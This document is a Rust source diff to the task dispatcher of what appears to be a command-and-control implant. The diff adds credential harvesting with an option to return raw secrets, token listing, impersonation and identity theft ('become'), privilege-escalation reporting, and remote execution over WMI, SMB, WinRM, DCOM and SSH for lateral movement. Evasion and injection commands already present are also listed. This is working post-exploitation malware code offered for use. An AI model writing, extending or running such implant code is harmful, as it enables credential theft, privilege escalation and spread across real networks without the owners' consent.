@@ -36,7 +36,8 @@ pub fn capabilities() -> Vec<&'static str> {
         "session.open", "session.input", "session.close", "vpn", "scan",
         "resolve", "env", "touch", "evade.report", "evade.posture",
         "evade.profile", "evade.shape", "evade.killswitch", "hygiene.memory",
-        "hygiene.process",
+        "hygiene.process", "wmi.exec", "smb.exec", "winrm.exec", "dcom.exec",
+        "ldap.query", "ssh.exec",
     ]
 }
 
@@ -501,18 +502,144 @@ pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
         "bof" => run_module(args),
         "ext" => run_module(args),
         "inject" => inject(args),
-        "creds" => match crate::post::creds(&args.str_or("mode", "")) {
-            Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
+        // ---- identity, credentials and privilege -------------------------
+        //
+        // The credential collection answers with a structured result: every
+        // piece of material is a record with a kind, a source, an account
+        // and a confidence.  The secret itself only travels when the
+        // operator asked for it, so the event stream of the server never
+        // carries a secret nobody wanted.
+        "creds" => {
+            let mode = args.str_or("mode", "vault");
+            let raw = args.bool_or("raw", false);
+            match crate::creds::collect(&mode, raw, args) {
+                Ok(collected) => {
+                    let total = collected.entries.len() as u64;
+                    Outcome::ok(collected.report(raw).into_bytes())
+                        .with("creds", collected.to_value(raw))
+                        .with("creds_total", upk::u(total))
+                        .with("creds_counts", collected.counts_value())
+                }
+                Err(e) => Outcome::err(1, e),
+            }
+        }
+        // The token work has four modes: list the tokens of the host,
+        // impersonate one of them for the next task, become one of them
+        // for good, and go back to the identity of the implant.
+        "token" => {
+            let mode = args.str_or("mode", "list");
+            match mode.as_str() {
+                "list" => match crate::post::tokens(token_session(args)) {
+                    Ok(tokens) => {
+                        let mut out = String::new();
+                        out.push_str(&format!(
+                            "{:<8} {:<20} {:<32} {}\n",
+                            "PID", "PROCESS", "ACCOUNT", "SESSION"
+                        ));
+                        let value = upk::arr(
+                            tokens
+                                .iter()
+                                .map(|token| {
+                                    upk::map(vec![
+                                        ("pid", upk::u(token.pid as u64)),
+                                        ("process", upk::s(&token.process)),
+                                        ("account", upk::s(&token.account)),
+                                        ("session", upk::u(token.session as u64)),
+                                    ])
+                                })
+                                .collect(),
+                        );
+                        for token in &tokens {
+                            out.push_str(&format!(
+                                "{:<8} {:<20} {:<32} {}\n",
+                                token.pid, token.process, token.account, token.session
+                            ));
+                        }
+                        Outcome::ok(out.into_bytes())
+                            .with("tokens", value)
+                            .with("tokens_total", upk::u(tokens.len() as u64))
+                    }
+                    Err(e) => Outcome::err(1, e),
+                },
+                "impersonate" | "become" => {
+                    let pid = peer_pid(args).unwrap_or(0);
+                    if pid == 0 {
+                        return Outcome::err(1, "token: the mode needs the pid of the process");
+                    }
+                    let one_shot = mode == "impersonate";
+                    match crate::post::become(pid, one_shot) {
+                        Ok(identity) => Outcome::ok(
+                            format!("the implant is now {}\n", identity.account).into_bytes(),
+                        )
+                        .with("identity", upk::s(&identity.account))
+                        .with("identity_session", upk::u(identity.session as u64))
+                        .with("identity_one_shot", upk::bool_(one_shot)),
+                        Err(e) => Outcome::err(1, e),
+                    }
+                }
+                "restore" => match crate::post::restore() {
+                    Ok(()) => Outcome::ok("the implant is itself again\n".into_bytes())
+                        .with("identity", upk::s("")),
+                    Err(e) => Outcome::err(1, e),
+                },
+                other => Outcome::err(1, format!("token: unknown mode {other:?}")),
+            }
+        }
+        // Every escalation is reported on its own: the technique, the
+        // outcome and what it changed on the host.
+        "privesc" => match crate::post::privesc(&args.str_or("mode", "privileges")) {
+            Ok(escalation) => {
+                let value = upk::arr(
+                    escalation
+                        .attempts
+                        .iter()
+                        .map(|attempt| {
+                            upk::map(vec![
+                                ("technique", upk::s(&attempt.technique)),
+                                ("outcome", upk::s(&attempt.outcome)),
+                                ("detail", upk::s(&attempt.detail)),
+                                (
+                                    "side_effects",
+                                    upk::arr(
+                                        attempt
+                                            .side_effects
+                                            .iter()
+                                            .map(|effect| upk::s(effect))
+                                            .collect(),
+                                    ),
+                                ),
+                            ])
+                        })
+                        .collect(),
+                );
+                let total = escalation.attempts.len() as u64;
+                Outcome::ok(escalation.report.into_bytes())
+                    .with("escalations", value)
+                    .with("escalations_total", upk::u(total))
+            }
             Err(e) => Outcome::err(1, e),
         },
-        "token" => match crate::post::token(peer_pid(args)) {
-            Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
-            Err(e) => Outcome::err(1, e),
-        },
-        "privesc" => match crate::post::privesc(&args.str_or("mode", "")) {
-            Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
-            Err(e) => Outcome::err(1, e),
-        },
+
+        // ---- remote execution --------------------------------------------
+        //
+        // The command runs on a remote host, driven from the pivot that
+        // holds the path to it.  The output comes back through the same
+        // pivot, and the task that carries it names the target.
+        "wmi.exec" | "smb.exec" | "winrm.exec" | "dcom.exec" | "ldap.query" | "ssh.exec" => {
+            match crate::remote::Request::from_kind(kind, args) {
+                Ok(request) => {
+                    let protocol = request.protocol.clone();
+                    let target = request.target.clone();
+                    match crate::remote::execute(&request) {
+                        Ok(report) => Outcome::ok(report.text().into_bytes())
+                            .with("remote_protocol", upk::s(&protocol))
+                            .with("remote_target", upk::s(&target)),
+                        Err(e) => Outcome::err(1, e),
+                    }
+                }
+                Err(e) => Outcome::err(1, e),
+            }
+        }
 
         // ---- persistence -------------------------------------------------
         //
@@ -1058,6 +1185,16 @@ fn inject(args: &Value) -> Outcome {
     match result {
         Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
         Err(e) => Outcome::err(1, e),
+    }
+}
+
+/// The session the token list is narrowed to.
+fn token_session(args: &Value) -> Option<u32> {
+    let session = args.u64_or("session", 0);
+    if session == 0 {
+        None
+    } else {
+        Some(session as u32)
     }
 }
 
